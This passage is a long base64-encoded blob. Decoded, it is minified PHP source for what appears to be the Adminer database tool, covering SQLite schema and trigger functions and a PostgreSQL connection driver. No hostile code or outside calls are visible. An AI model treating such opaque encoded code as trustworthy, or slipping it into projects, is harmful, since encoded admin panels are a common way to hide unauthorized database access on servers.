mbygiLmlkZl9lc2NhcGUoJEMpLiIpIiwkaClhcyRoZyl7JHVbImNvbHVtbnMiXVtdPSRoZ1sibmFtZSJdOyR1WyJkZXNjcyJdW109bnVsbDt9aWYocHJlZ19tYXRjaCgnfl5DUkVBVEUoIFVOSVFVRSk/IElOREVYICcucHJlZ19xdW90ZShpZGZfZXNjYXBlKCRDKS4nIE9OICcuaWRmX2VzY2FwZSgkUSksJ34nKS4nIFwoKC4qKVwpJH5pJywkRGdbJENdLCRVZikpe3ByZWdfbWF0Y2hfYWxsKCcvKCJbXiJdKisiKSsoIERFU0MpPy8nLCRVZlsyXSwkYWUpO2ZvcmVhY2goJGFlWzJdYXMkeD0+JFgpe2lmKCRYKSR1WyJkZXNjcyJdWyR4XT0nMSc7fX1pZighJEpbIiJdfHwkdVsidHlwZSJdIT0iVU5JUVVFInx8JHVbImNvbHVtbnMiXSE9JEpbIiJdWyJjb2x1bW5zIl18fCR1WyJkZXNjcyJdIT0kSlsiIl1bImRlc2NzIl18fCFwcmVnX21hdGNoKCJ+XnNxbGl0ZV9+IiwkQykpJEpbJENdPSR1O31yZXR1cm4kSjt9ZnVuY3Rpb24NCmZvcmVpZ25fa2V5cygkUSl7JEo9YXJyYXkoKTtmb3JlYWNoKGdldF9yb3dzKCJQUkFHTUEgZm9yZWlnbl9rZXlfbGlzdCgiLnRhYmxlKCRRKS4iKSIpYXMkSyl7JHE9JiRKWyRLWyJpZCJdXTtpZighJHEpJHE9JEs7JHFbInNvdXJjZSJdW109JEtbImZyb20iXTskcVsidGFyZ2V0Il1bXT0kS1sidG8iXTt9cmV0dXJuJEo7fWZ1bmN0aW9uDQp2aWV3KCRDKXtnbG9iYWwkZztyZXR1cm4NCmFycmF5KCJzZWxlY3QiPT5wcmVnX3JlcGxhY2UoJ35eKD86W15gIltdK3xgW15gXSpgfCJbXiJdKiIpKiBBU1xccyt+aVUnLCcnLCRnLT5yZXN1bHQoIlNFTEVDVCBzcWwgRlJPTSBzcWxpdGVfbWFzdGVyIFdIRVJFIG5hbWUgPSAiLnEoJEMpKSkpO31mdW5jdGlvbg0KY29sbGF0aW9ucygpe3JldHVybihpc3NldCgkX0dFVFsiY3JlYXRlIl0pP2dldF92YWxzKCJQUkFHTUEgY29sbGF0aW9uX2xpc3QiLDEpOmFycmF5KCkpO31mdW5jdGlvbg0KaW5mb3JtYXRpb25fc2NoZW1hKCRtKXtyZXR1cm4NCmZhbHNlO31mdW5jdGlvbg0KZXJyb3IoKXtnbG9iYWwkZztyZXR1cm4NCmgoJGctPmVycm9yKTt9ZnVuY3Rpb24NCmNoZWNrX3NxbGl0ZV9uYW1lKCRDKXtnbG9iYWwkZzskQWM9ImRifHNkYnxzcWxpdGUiO2lmKCFwcmVnX21hdGNoKCJ+XlteXFwwXSpcXC4oJEFjKVwkfiIsJEMpKXskZy0+ZXJyb3I9c3ByaW50ZignUGxlYXNlIHVzZSBvbmUgb2YgdGhlIGV4dGVuc2lvbnMgJXMuJyxzdHJfcmVwbGFjZSgifCIsIiwgIiwkQWMpKTtyZXR1cm4NCmZhbHNlO31yZXR1cm4NCnRydWU7fWZ1bmN0aW9uDQpjcmVhdGVfZGF0YWJhc2UoJG0sJGQpe2dsb2JhbCRnO2lmKGZpbGVfZXhpc3RzKCRtKSl7JGctPmVycm9yPSdGaWxlIGV4aXN0cy4nO3JldHVybg0KZmFsc2U7fWlmKCFjaGVja19zcWxpdGVfbmFtZSgkbSkpcmV0dXJuDQpmYWxzZTt0cnl7JF89bmV3DQpNaW5fU1FMaXRlKCRtKTt9Y2F0Y2goRXhjZXB0aW9uJHNjKXskZy0+ZXJyb3I9JHNjLT5nZXRNZXNzYWdlKCk7cmV0dXJuDQpmYWxzZTt9JF8tPnF1ZXJ5KCdQUkFHTUEgZW5jb2RpbmcgPSAiVVRGLTgiJyk7JF8tPnF1ZXJ5KCdDUkVBVEUgVEFCTEUgYWRtaW5lciAoaSknKTskXy0+cXVlcnkoJ0RST1AgVEFCTEUgYWRtaW5lcicpO3JldHVybg0KdHJ1ZTt9ZnVuY3Rpb24NCmRyb3BfZGF0YWJhc2VzKCRsKXtnbG9iYWwkZzskZy0+X19jb25zdHJ1Y3QoIjptZW1vcnk6Iik7Zm9yZWFjaCgkbA0KYXMkbSl7aWYoIUB1bmxpbmsoJG0pKXskZy0+ZXJyb3I9J0ZpbGUgZXhpc3RzLic7cmV0dXJuDQpmYWxzZTt9fXJldHVybg0KdHJ1ZTt9ZnVuY3Rpb24NCnJlbmFtZV9kYXRhYmFzZSgkQywkZCl7Z2xvYmFsJGc7aWYoIWNoZWNrX3NxbGl0ZV9uYW1lKCRDKSlyZXR1cm4NCmZhbHNlOyRnLT5fX2NvbnN0cnVjdCgiOm1lbW9yeToiKTskZy0+ZXJyb3I9J0ZpbGUgZXhpc3RzLic7cmV0dXJuQHJlbmFtZShEQiwkQyk7fWZ1bmN0aW9uDQphdXRvX2luY3JlbWVudCgpe3JldHVybiIgUFJJTUFSWSBLRVkiLihEUklWRVI9PSJzcWxpdGUiPyIgQVVUT0lOQ1JFTUVOVCI6IiIpO31mdW5jdGlvbg0KYWx0ZXJfdGFibGUoJFEsJEMsJHAsJEtjLCRxYiwkbGMsJGQsJEthLCRrZil7JEtoPSgkUT09IiJ8fCRLYyk7Zm9yZWFjaCgkcA0KYXMkbyl7aWYoJG9bMF0hPSIifHwhJG9bMV18fCRvWzJdKXskS2g9dHJ1ZTticmVhazt9fSRjPWFycmF5KCk7JGJmPWFycmF5KCk7Zm9yZWFjaCgkcA0KYXMkbyl7aWYoJG9bMV0peyRjW109KCRLaD8kb1sxXToiQUREICIuaW1wbG9kZSgkb1sxXSkpO2lmKCRvWzBdIT0iIikkYmZbJG9bMF1dPSRvWzFdWzBdO319aWYoISRLaCl7Zm9yZWFjaCgkYw0KYXMkWCl7aWYoIXF1ZXJpZXMoIkFMVEVSIFRBQkxFICIudGFibGUoJFEpLiIgJFgiKSlyZXR1cm4NCmZhbHNlO31pZigkUSE9JEMmJiFxdWVyaWVzKCJBTFRFUiBUQUJMRSAiLnRhYmxlKCRRKS4iIFJFTkFNRSBUTyAiLnRhYmxlKCRDKSkpcmV0dXJuDQpmYWxzZTt9ZWxzZWlmKCFyZWNyZWF0ZV90YWJsZSgkUSwkQywkYywkYmYsJEtjKSlyZXR1cm4NCmZhbHNlO2lmKCRLYSlxdWVyaWVzKCJVUERBVEUgc3FsaXRlX3NlcXVlbmNlIFNFVCBzZXEgPSAkS2EgV0hFUkUgbmFtZSA9ICIucSgkQykpO3JldHVybg0KdHJ1ZTt9ZnVuY3Rpb24NCnJlY3JlYXRlX3RhYmxlKCRRLCRDLCRwLCRiZiwkS2MsJHY9YXJyYXkoKSl7aWYoJFEhPSIiKXtpZighJHApe2ZvcmVhY2goZmllbGRzKCRRKWFzJHg9PiRvKXskcFtdPXByb2Nlc3NfZmllbGQoJG8sJG8pOyRiZlskeF09aWRmX2VzY2FwZSgkeCk7fX0kX2Y9ZmFsc2U7Zm9yZWFjaCgkcA0KYXMkbyl7aWYoJG9bNl0pJF9mPXRydWU7fSRZYj1hcnJheSgpO2ZvcmVhY2goJHYNCmFzJHg9PiRYKXtpZigkWFsyXT09IkRST1AiKXskWWJbJFhbMV1dPXRydWU7dW5zZXQoJHZbJHhdKTt9fWZvcmVhY2goaW5kZXhlcygkUSlhcyRIZD0+JHUpeyRmPWFycmF5KCk7Zm9yZWFjaCgkdVsiY29sdW1ucyJdYXMkeD0+JGUpe2lmKCEkYmZbJGVdKWNvbnRpbnVlDQoyOyRmW109JGJmWyRlXS4oJHVbImRlc2NzIl1bJHhdPyIgREVTQyI6IiIpO31pZighJFliWyRIZF0pe2lmKCR1WyJ0eXBlIl0hPSJQUklNQVJZInx8ISRfZikkdltdPWFycmF5KCR1WyJ0eXBlIl0sJEhkLCRmKTt9fWZvcmVhY2goJHYNCmFzJHg9PiRYKXtpZigkWFswXT09IlBSSU1BUlkiKXt1bnNldCgkdlskeF0pOyRLY1tdPSIgIFBSSU1BUlkgS0VZICgiLmltcGxvZGUoIiwgIiwkWFsyXSkuIikiO319Zm9yZWFjaChmb3JlaWduX2tleXMoJFEpYXMkSGQ9PiRxKXtmb3JlYWNoKCRxWyJzb3VyY2UiXWFzJHg9PiRlKXtpZighJGJmWyRlXSljb250aW51ZQ0KMjskcVsic291cmNlIl1bJHhdPWlkZl91bmVzY2FwZSgkYmZbJGVdKTt9aWYoIWlzc2V0KCRLY1siICRIZCJdKSkkS2NbXT0iICIuZm9ybWF0X2ZvcmVpZ25fa2V5KCRxKTt9cXVlcmllcygiQkVHSU4iKTt9Zm9yZWFjaCgkcA0KYXMkeD0+JG8pJHBbJHhdPSIgICIuaW1wbG9kZSgkbyk7JHA9YXJyYXlfbWVyZ2UoJHAsYXJyYXlfZmlsdGVyKCRLYykpO2lmKCFxdWVyaWVzKCJDUkVBVEUgVEFCTEUgIi50YWJsZSgkUSE9IiI/ImFkbWluZXJfJEMiOiRDKS4iIChcbiIuaW1wbG9kZSgiLFxuIiwkcCkuIlxuKSIpKXJldHVybg0KZmFsc2U7aWYoJFEhPSIiKXtpZigkYmYmJiFxdWVyaWVzKCJJTlNFUlQgSU5UTyAiLnRhYmxlKCJhZG1pbmVyXyRDIikuIiAoIi5pbXBsb2RlKCIsICIsJGJmKS4iKSBTRUxFQ1QgIi5pbXBsb2RlKCIsICIsYXJyYXlfbWFwKCdpZGZfZXNjYXBlJyxhcnJheV9rZXlzKCRiZikpKS4iIEZST00gIi50YWJsZSgkUSkpKXJldHVybg0KZmFsc2U7JHdoPWFycmF5KCk7Zm9yZWFjaCh0cmlnZ2VycygkUSlhcyR1aD0+JGhoKXskdGg9dHJpZ2dlcigkdWgpOyR3aFtdPSJDUkVBVEUgVFJJR0dFUiAiLmlkZl9lc2NhcGUoJHVoKS4iICIuaW1wbG9kZSgiICIsJGhoKS4iIE9OICIudGFibGUoJEMpLiJcbiR0aFtTdGF0ZW1lbnRdIjt9aWYoIXF1ZXJpZXMoIkRST1AgVEFCTEUgIi50YWJsZSgkUSkpKXJldHVybg0KZmFsc2U7cXVlcmllcygiQUxURVIgVEFCTEUgIi50YWJsZSgiYWRtaW5lcl8kQyIpLiIgUkVOQU1FIFRPICIudGFibGUoJEMpKTtpZighYWx0ZXJfaW5kZXhlcygkQywkdikpcmV0dXJuDQpmYWxzZTtmb3JlYWNoKCR3aA0KYXMkdGgpe2lmKCFxdWVyaWVzKCR0aCkpcmV0dXJuDQpmYWxzZTt9cXVlcmllcygiQ09NTUlUIik7fXJldHVybg0KdHJ1ZTt9ZnVuY3Rpb24NCmluZGV4X3NxbCgkUSwkVSwkQywkZil7cmV0dXJuIkNSRUFURSAkVSAiLigkVSE9IklOREVYIj8iSU5ERVggIjoiIikuaWRmX2VzY2FwZSgkQyE9IiI/JEM6dW5pcWlkKCRRLiJfIikpLiIgT04gIi50YWJsZSgkUSkuIiAkZiI7fWZ1bmN0aW9uDQphbHRlcl9pbmRleGVzKCRRLCRjKXtmb3JlYWNoKCRjDQphcyR6Zil7aWYoJHpmWzBdPT0iUFJJTUFSWSIpcmV0dXJuDQpyZWNyZWF0ZV90YWJsZSgkUSwkUSxhcnJheSgpLGFycmF5KCksYXJyYXkoKSwkYyk7fWZvcmVhY2goYXJyYXlfcmV2ZXJzZSgkYylhcyRYKXtpZighcXVlcmllcygkWFsyXT09IkRST1AiPyJEUk9QIElOREVYICIuaWRmX2VzY2FwZSgkWFsxXSk6aW5kZXhfc3FsKCRRLCRYWzBdLCRYWzFdLCIoIi5pbXBsb2RlKCIsICIsJFhbMl0pLiIpIikpKXJldHVybg0KZmFsc2U7fXJldHVybg0KdHJ1ZTt9ZnVuY3Rpb24NCnRydW5jYXRlX3RhYmxlcygkUyl7cmV0dXJuDQphcHBseV9xdWVyaWVzKCJERUxFVEUgRlJPTSIsJFMpO31mdW5jdGlvbg0KZHJvcF92aWV3cygkVmgpe3JldHVybg0KYXBwbHlfcXVlcmllcygiRFJPUCBWSUVXIiwkVmgpO31mdW5jdGlvbg0KZHJvcF90YWJsZXMoJFMpe3JldHVybg0KYXBwbHlfcXVlcmllcygiRFJPUCBUQUJMRSIsJFMpO31mdW5jdGlvbg0KbW92ZV90YWJsZXMoJFMsJFZoLCRZZyl7cmV0dXJuDQpmYWxzZTt9ZnVuY3Rpb24NCnRyaWdnZXIoJEMpe2dsb2JhbCRnO2lmKCRDPT0iIilyZXR1cm4NCmFycmF5KCJTdGF0ZW1lbnQiPT4iQkVHSU5cblx0O1xuRU5EIik7JHQ9Jyg/OlteYCJcXHNdK3xgW15gXSpgfCJbXiJdKiIpKyc7JHZoPXRyaWdnZXJfb3B0aW9ucygpO3ByZWdfbWF0Y2goIn5eQ1JFQVRFXFxzK1RSSUdHRVJcXHMqJHRcXHMqKCIuaW1wbG9kZSgifCIsJHZoWyJUaW1pbmciXSkuIilcXHMrKFthLXpdKykoPzpcXHMrT0ZcXHMrKCR0KSk/XFxzK09OXFxzKiR0XFxzKig/OkZPUlxccytFQUNIXFxzK1JPV1xccyk/KC4qKX5pcyIsJGctPnJlc3VsdCgiU0VMRUNUIHNxbCBGUk9NIHNxbGl0ZV9tYXN0ZXIgV0hFUkUgdHlwZSA9ICd0cmlnZ2VyJyBBTkQgbmFtZSA9ICIucSgkQykpLCRCKTskQ2U9JEJbM107cmV0dXJuDQphcnJheSgiVGltaW5nIj0+c3RydG91cHBlcigkQlsxXSksIkV2ZW50Ij0+c3RydG91cHBlcigkQlsyXSkuKCRDZT8iIE9GIjoiIiksIk9mIj0+KCRDZVswXT09J2AnfHwkQ2VbMF09PSciJz9pZGZfdW5lc2NhcGUoJENlKTokQ2UpLCJUcmlnZ2VyIj0+JEMsIlN0YXRlbWVudCI9PiRCWzRdLCk7fWZ1bmN0aW9uDQp0cmlnZ2VycygkUSl7JEo9YXJyYXkoKTskdmg9dHJpZ2dlcl9vcHRpb25zKCk7Zm9yZWFjaChnZXRfcm93cygiU0VMRUNUICogRlJPTSBzcWxpdGVfbWFzdGVyIFdIRVJFIHR5cGUgPSAndHJpZ2dlcicgQU5EIHRibF9uYW1lID0gIi5xKCRRKSlhcyRLKXtwcmVnX21hdGNoKCd+XkNSRUFURVxccytUUklHR0VSXFxzKig/OlteYCJcXHNdK3xgW15gXSpgfCJbXiJdKiIpK1xccyooJy5pbXBsb2RlKCJ8IiwkdmhbIlRpbWluZyJdKS4nKVxccyooLiopXFxzK09OXFxifmlVJywkS1sic3FsIl0sJEIpOyRKWyRLWyJuYW1lIl1dPWFycmF5KCRCWzFdLCRCWzJdKTt9cmV0dXJuJEo7fWZ1bmN0aW9uDQp0cmlnZ2VyX29wdGlvbnMoKXtyZXR1cm4NCmFycmF5KCJUaW1pbmciPT5hcnJheSgiQkVGT1JFIiwiQUZURVIiLCJJTlNURUFEIE9GIiksIkV2ZW50Ij0+YXJyYXkoIklOU0VSVCIsIlVQREFURSIsIlVQREFURSBPRiIsIkRFTEVURSIpLCJUeXBlIj0+YXJyYXkoIkZPUiBFQUNIIFJPVyIpLCk7fWZ1bmN0aW9uDQpyb3V0aW5lKCRDLCRVKXt9ZnVuY3Rpb24NCnJvdXRpbmVzKCl7fWZ1bmN0aW9uDQpyb3V0aW5lX2xhbmd1YWdlcygpe31mdW5jdGlvbg0KYmVnaW4oKXtyZXR1cm4NCnF1ZXJpZXMoIkJFR0lOIik7fWZ1bmN0aW9uDQpsYXN0X2lkKCl7Z2xvYmFsJGc7cmV0dXJuJGctPnJlc3VsdCgiU0VMRUNUIExBU1RfSU5TRVJUX1JPV0lEKCkiKTt9ZnVuY3Rpb24NCmV4cGxhaW4oJGcsJEgpe3JldHVybiRnLT5xdWVyeSgiRVhQTEFJTiBRVUVSWSBQTEFOICRIIik7fWZ1bmN0aW9uDQpmb3VuZF9yb3dzKCRSLCRaKXt9ZnVuY3Rpb24NCnR5cGVzKCl7cmV0dXJuDQphcnJheSgpO31mdW5jdGlvbg0Kc2NoZW1hcygpe3JldHVybg0KYXJyYXkoKTt9ZnVuY3Rpb24NCmdldF9zY2hlbWEoKXtyZXR1cm4iIjt9ZnVuY3Rpb24NCnNldF9zY2hlbWEoJGxnKXtyZXR1cm4NCnRydWU7fWZ1bmN0aW9uDQpjcmVhdGVfc3FsKCRRLCRLYSl7Z2xvYmFsJGc7JEo9JGctPnJlc3VsdCgiU0VMRUNUIHNxbCBGUk9NIHNxbGl0ZV9tYXN0ZXIgV0hFUkUgdHlwZSBJTiAoJ3RhYmxlJywgJ3ZpZXcnKSBBTkQgbmFtZSA9ICIucSgkUSkpO2ZvcmVhY2goaW5kZXhlcygkUSlhcyRDPT4kdSl7aWYoJEM9PScnKWNvbnRpbnVlOyRKLj0iO1xuXG4iLmluZGV4X3NxbCgkUSwkdVsndHlwZSddLCRDLCIoIi5pbXBsb2RlKCIsICIsYXJyYXlfbWFwKCdpZGZfZXNjYXBlJywkdVsnY29sdW1ucyddKSkuIikiKTt9cmV0dXJuJEo7fWZ1bmN0aW9uDQp0cnVuY2F0ZV9zcWwoJFEpe3JldHVybiJERUxFVEUgRlJPTSAiLnRhYmxlKCRRKTt9ZnVuY3Rpb24NCnVzZV9zcWwoJGspe31mdW5jdGlvbg0KdHJpZ2dlcl9zcWwoJFEsJEpnKXtyZXR1cm4NCmltcGxvZGUoZ2V0X3ZhbHMoIlNFTEVDVCBzcWwgfHwgJzs7XG4nIEZST00gc3FsaXRlX21hc3RlciBXSEVSRSB0eXBlID0gJ3RyaWdnZXInIEFORCB0YmxfbmFtZSA9ICIucSgkUSkpKTt9ZnVuY3Rpb24NCnNob3dfdmFyaWFibGVzKCl7Z2xvYmFsJGc7JEo9YXJyYXkoKTtmb3JlYWNoKGFycmF5KCJhdXRvX3ZhY3V1bSIsImNhY2hlX3NpemUiLCJjb3VudF9jaGFuZ2VzIiwiZGVmYXVsdF9jYWNoZV9zaXplIiwiZW1wdHlfcmVzdWx0X2NhbGxiYWNrcyIsImVuY29kaW5nIiwiZm9yZWlnbl9rZXlzIiwiZnVsbF9jb2x1bW5fbmFtZXMiLCJmdWxsZnN5bmMiLCJqb3VybmFsX21vZGUiLCJqb3VybmFsX3NpemVfbGltaXQiLCJsZWdhY3lfZmlsZV9mb3JtYXQiLCJsb2NraW5nX21vZGUiLCJwYWdlX3NpemUiLCJtYXhfcGFnZV9jb3VudCIsInJlYWRfdW5jb21taXR0ZWQiLCJyZWN1cnNpdmVfdHJpZ2dlcnMiLCJyZXZlcnNlX3Vub3JkZXJlZF9zZWxlY3RzIiwic2VjdXJlX2RlbGV0ZSIsInNob3J0X2NvbHVtbl9uYW1lcyIsInN5bmNocm9ub3VzIiwidGVtcF9zdG9yZSIsInRlbXBfc3RvcmVfZGlyZWN0b3J5Iiwic2NoZW1hX3ZlcnNpb24iLCJpbnRlZ3JpdHlfY2hlY2siLCJxdWlja19jaGVjayIpYXMkeCkkSlskeF09JGctPnJlc3VsdCgiUFJBR01BICR4Iik7cmV0dXJuJEo7fWZ1bmN0aW9uDQpzaG93X3N0YXR1cygpeyRKPWFycmF5KCk7Zm9yZWFjaChnZXRfdmFscygiUFJBR01BIGNvbXBpbGVfb3B0aW9ucyIpYXMkUWUpe2xpc3QoJHgsJFgpPWV4cGxvZGUoIj0iLCRRZSwyKTskSlskeF09JFg7fXJldHVybiRKO31mdW5jdGlvbg0KY29udmVydF9maWVsZCgkbyl7fWZ1bmN0aW9uDQp1bmNvbnZlcnRfZmllbGQoJG8sJEope3JldHVybiRKO31mdW5jdGlvbg0Kc3VwcG9ydCgkRGMpe3JldHVybg0KcHJlZ19tYXRjaCgnfl4oY29sdW1uc3xkYXRhYmFzZXxkcm9wX2NvbHxkdW1wfGluZGV4ZXN8bW92ZV9jb2x8c3FsfHN0YXR1c3x0YWJsZXx0cmlnZ2VyfHZhcmlhYmxlc3x2aWV3fHZpZXdfdHJpZ2dlcikkficsJERjKTt9JHc9InNxbGl0ZSI7JHpoPWFycmF5KCJpbnRlZ2VyIj0+MCwicmVhbCI9PjAsIm51bWVyaWMiPT4wLCJ0ZXh0Ij0+MCwiYmxvYiI9PjApOyRJZz1hcnJheV9rZXlzKCR6aCk7JEZoPWFycmF5KCk7JE9lPWFycmF5KCI9IiwiPCIsIj4iLCI8PSIsIj49IiwiIT0iLCJMSUtFIiwiTElLRSAlJSIsIklOIiwiSVMgTlVMTCIsIk5PVCBMSUtFIiwiTk9UIElOIiwiSVMgTk9UIE5VTEwiLCJTUUwiKTskU2M9YXJyYXkoImhleCIsImxlbmd0aCIsImxvd2VyIiwicm91bmQiLCJ1bml4ZXBvY2giLCJ1cHBlciIpOyRYYz1hcnJheSgiYXZnIiwiY291bnQiLCJjb3VudCBkaXN0aW5jdCIsImdyb3VwX2NvbmNhdCIsIm1heCIsIm1pbiIsInN1bSIpOyRkYz1hcnJheShhcnJheSgpLGFycmF5KCJpbnRlZ2VyfHJlYWx8bnVtZXJpYyI9PiIrLy0iLCJ0ZXh0Ij0+Inx8IiwpKTt9JFZiWyJwZ3NxbCJdPSJQb3N0Z3JlU1FMIjtpZihpc3NldCgkX0dFVFsicGdzcWwiXSkpeyR3Zj1hcnJheSgiUGdTUUwiLCJQRE9fUGdTUUwiKTtkZWZpbmUoIkRSSVZFUiIsInBnc3FsIik7aWYoZXh0ZW5zaW9uX2xvYWRlZCgicGdzcWwiKSl7Y2xhc3MNCk1pbl9EQnt2YXIkZXh0ZW5zaW9uPSJQZ1NRTCIsJF9saW5rLCRfcmVzdWx0LCRfc3RyaW5nLCRfZGF0YWJhc2U9dHJ1ZSwkc2VydmVyX2luZm8sJGFmZmVjdGVkX3Jvd3MsJGVycm9yO2Z1bmN0aW9uDQpfZXJyb3IoJG9jLCRuKXtpZihpbmlfYm9vbCgiaHRtbF9lcnJvcnMiKSkkbj1odG1sX2VudGl0eV9kZWNvZGUoc3RyaXBfdGFncygkbikpOyRuPXByZWdfcmVwbGFjZSgnfl5bXjpdKjogficsJycsJG4pOyR0aGlzLT5lcnJvcj0kbjt9ZnVuY3Rpb24NCmNvbm5lY3QoJE4sJFYsJEcpe2dsb2JhbCRiOyRtPSRiLT5kYXRhYmFzZSgpO3NldF9lcnJvcl9oYW5kbGVyKGFycmF5KCR0aGlzLCdfZXJyb3InKSk7JHRoaXMtPl9zdHJpbmc9Imhvc3Q9JyIuc3RyX3JlcGxhY2UoIjoiLCInIHBvcnQ9JyIsYWRkY3NsYXNoZXMoJE4sIidcXCIpKS4iJyB1c2VyPSciLmFkZGNzbGFzaGVzKCRWLCInXFwiKS4iJyBwYXNzd29yZD0nIi5hZGRjc2xhc2hlcygkRywiJ1xcIikuIiciOyR0aGlzLT5fbGluaz1AcGdfY29ubmVjdCgiJHRoaXMtPl9zdHJpbmcgZGJuYW1lPSciLigkbSE9IiI/YWRkY3NsYXNoZXMoJG0sIidcXCIpOiJwb3N0Z3JlcyIpLiInIixQR1NRTF9DT05ORUNUX0ZPUkNFX05FVyk7aWYoISR0aGlzLT5fbGluayYmJG0hPSIiKXskdGhpcy0+X2RhdGFiYXNlPWZhbHNlOyR0aGlzLT5fbGluaz1AcGdfY29ubmVjdCgiJHRoaXMtPl9zdHJpbmcgZGJuYW1lPSdwb3N0Z3JlcyciLFBHU1FMX0NPTk5FQ1RfRk9SQ0VfTkVXKTt9cmVzdG9yZV9lcnJvcl9oYW5kbGVyKCk7aWYoJHRoaXMtPl9saW5rKXskVGg9cGdfdmVyc2lvbigkdGhpcy0+X2xpbmspOyR0aGlzLT5zZXJ2ZXJfaW5mbz0kVGhbInNlcnZlciJdO3BnX3NldF9jbGllbnRfZW5jb2RpbmcoJHRoaXMtPl9saW5rLCJVVEY4Iik7fXJldHVybihib29sKSR0aGlzLT5fbGluazt9ZnVuY3Rpb24NCnF1b3RlKCRQKXtyZXR1cm4iJyIucGdfZXNjYXBlX3N0cmluZygkdGhpcy0+X2xpbmssJFApLiInIjt9ZnVuY3Rpb24NCnNlbGVjdF9kYigkayl7Z2xvYmFsJGI7aWYoJGs9PSRiLT5kYXRhYmFzZSgpKXJldHVybiR0aGlzLT5fZGF0YWJhc2U7JEo9QHBnX2Nvbm5lY3QoIiR0aGlzLT5fc3RyaW5nIGRibmFtZT0nIi5hZGRjc2xhc2hlcygkaywiJ1xcIikuIiciLFBHU1FMX0NPTk5FQ1RfRk9SQ0VfTkVXKTtpZigkSikkdGhpcy0+X2xpbms9JEo7cmV0dXJuJEo7fWZ1bmN0aW9uDQpjbG9zZSgpeyR0aGlzLT5fbGluaz1AcGdfY29ubmVjdCgiJHRoaXMtPl9zdHJpbmcgZGJuYW1lPSdwb3N0Z3JlcyciKTt9ZnVuY3Rpb24NCnF1ZXJ5KCRILCRfaD1mYWxzZSl7JEk9QHBnX3F1ZXJ5KCR0aGlzLT5fbGluaywkSCk7JHRoaXMtPmVycm9yPSIiO2lmKCEkSSl7JHRoaXMtPmVycm9yPXBnX2xhc3RfZXJyb3IoJHRoaXMtPl9saW5rKTtyZXR1cm4NCmZhbHNlO31lbHNlaWYoIXBnX251bV9maWVsZHMoJEkpKXskdGhpcy0+YWZmZWN0ZWRfcm93cz1wZ19hZmZlY3RlZF9yb3dzKCRJKTtyZXR1cm4NCnRydWU7fXJldHVybg0KbmV3DQpNaW5fUmVzdWx0KCRJKTt9ZnVuY3Rpb24NCm11bHRpX3F1ZXJ5KCRIKXtyZXR1cm4kdGhpcy0+X3Jlc3VsdD0kdGhpcy0+cXVlcnkoJEgpO31mdW5jdGlvbg0Kc3RvcmVfcmVzdWx0KCl7cmV0dXJuJHRoaXMtPl9yZXN1bHQ7fWZ1bmN0aW9uDQpuZXh0X3Jlc3VsdCgpe3JldHVybg0KZmFsc2U7fWZ1bmN0aW9uDQpyZXN1bHQoJEgsJG89MCl7JEk9JHRoaXMtPnF1ZXJ5KCRIKTtpZighJEl8fCEkSS0+bnVtX3Jvd3MpcmV0dXJuDQpmYWxzZTtyZXR1cm4NCnBnX2ZldGNoX3Jlc3VsdCgkSS0+X3Jlc3VsdCwwLCRvKTt9fWNsYXNzDQpNaW5fUmVzdWx0e3ZhciRfcmVzdWx0LCRfb2Zmc2V0PTAsJG51bV9yb3dzO2Z1bmN0aW9uDQpfX2NvbnN0cnVjdCgkSSl7JHRoaXMtPl9yZXN1bHQ9JEk7JHRoaXMtPm51bV9yb3dzPXBnX251bV9yb3dzKCRJKTt9ZnVuY3Rpb24NCmZldGNoX2Fzc29jKCl7cmV0dXJuDQpwZ19mZXRjaF9hc3NvYygkdGhpcy0+X3Jlc3VsdCk7fWZ1bmN0aW9uDQpmZXRjaF9yb3coKXtyZXR1cm4NCnBnX2ZldGNoX3JvdygkdGhpcy0+X3Jlc3VsdCk7fWZ1bmN0aW9uDQpmZXRjaF9maWVsZCgpeyRlPSR0aGlzLT5fb2Zmc2V0Kys7JEo9bmV3DQpzdGRDbGFzcztpZihmdW5jdGlvbl9leGlzdHMoJ3BnX2ZpZWxkX3RhYmxlJykpJEotPm9yZ3RhYmxlPXBnX2ZpZWxkX3RhYmxlKCR0aGlzLT5fcmVzdWx0LCRlKTskSi0+bmFtZT1wZ19maWVsZF9uYW1lKCR0aGlzLT5fcmVzdWx0LCRlKTskSi0+b3JnbmFtZT0kSi0+bmFtZTskSi0+dHlwZT1wZ19maWVsZF90eXBlKCR0aGlzLT5fcmVzdWx0LCRlKTskSi0+Y2hhcnNldG5yPSgkSi0+dHlwZT09ImJ5dGVhIj82MzowKTtyZXR1cm4kSjt9ZnVuY3Rpb24NCl9fZGVzdHJ1Y3QoKXtwZ19mcmVlX3Jlc3VsdCgkdGhpcy0+X3Jlc3VsdCk7fX19ZWxzZWlmKGV4dGVuc2lvbl9sb2FkZWQoInBkb19wZ3NxbCIpKXtjbGFzcw0KTWluX0RCDQpleHRlbmRzDQpNaW5fUERPe3ZhciRleHRlbnNpb249IlBET19QZ1NRTCI7ZnVuY3Rpb24NCmNvbm5lY3QoJE4sJFYsJEcpe2dsb2JhbCRiOyRtPSRiLT5kYXRhYmFzZSgpOyRQPSJwZ3NxbDpob3N0PSciLnN0cl9yZXBsYWNlKCI6IiwiJyBwb3J0PSciLGFkZGNzbGFzaGVzKCROLCInXFwiKSkuIicgb3B0aW9ucz0nLWMgY2xpZW50X2VuY29kaW5nPXV0ZjgnIjskdGhpcy0+ZHNuKCIkUCBkYm5hbWU9JyIuKCRtIT0iIj9hZGRjc2xhc2hlcygkbSwiJ1xcIik6InBvc3RncmVzIikuIiciLCRWLCRHKTtyZXR1cm4NCnRydWU7fWZ1bmN0aW9uDQpzZWxlY3RfZGIoJGspe2dsb2JhbCRiO3JldHVybigkYi0+ZGF0YWJhc2UoKT09JGspO31mdW5jdGlvbg0KY2xvc2UoKXt9fX1jbGFzcw0KTWluX0RyaXZlcg0KZXh0ZW5kcw0KTWluX1NRTHtmdW5jdGlvbg0KaW5zZXJ0VXBkYXRlKCRRLCRMLCR6Zil7Z2xvYmFsJGc7Zm9yZWFjaCgkTA0KYXMkTyl7JEdoPWFycmF5KCk7JFo9YXJyYXkoKTtmb3JlYWNoKCRPDQphcyR4PT4kWCl7JEdoW109IiR4ID0gJFgiO2lmKGlzc2V0KCR6ZltpZGZfdW5lc2NhcGUoJHgpXSkpJFpbXT0iJHggPSAkWCI7fWlmKCEoKCRaJiZxdWVyaWVzKCJVUERBVEUgIi50YWJsZSgkUSkuIiBTRVQgIi5pbXBsb2RlKCIsICIsJEdoKS4iIFdIRVJFICIuaW1wbG9kZSgiIEFORCAiLCRaKSkmJiRnLT5hZmZlY3RlZF9yb3dzKXx8cXVlcmllcygiSU5TRVJUIElOVE8gIi50YWJsZSgkUSkuIiAoIi5pbXBsb2RlKCIsICIsYXJyYXlf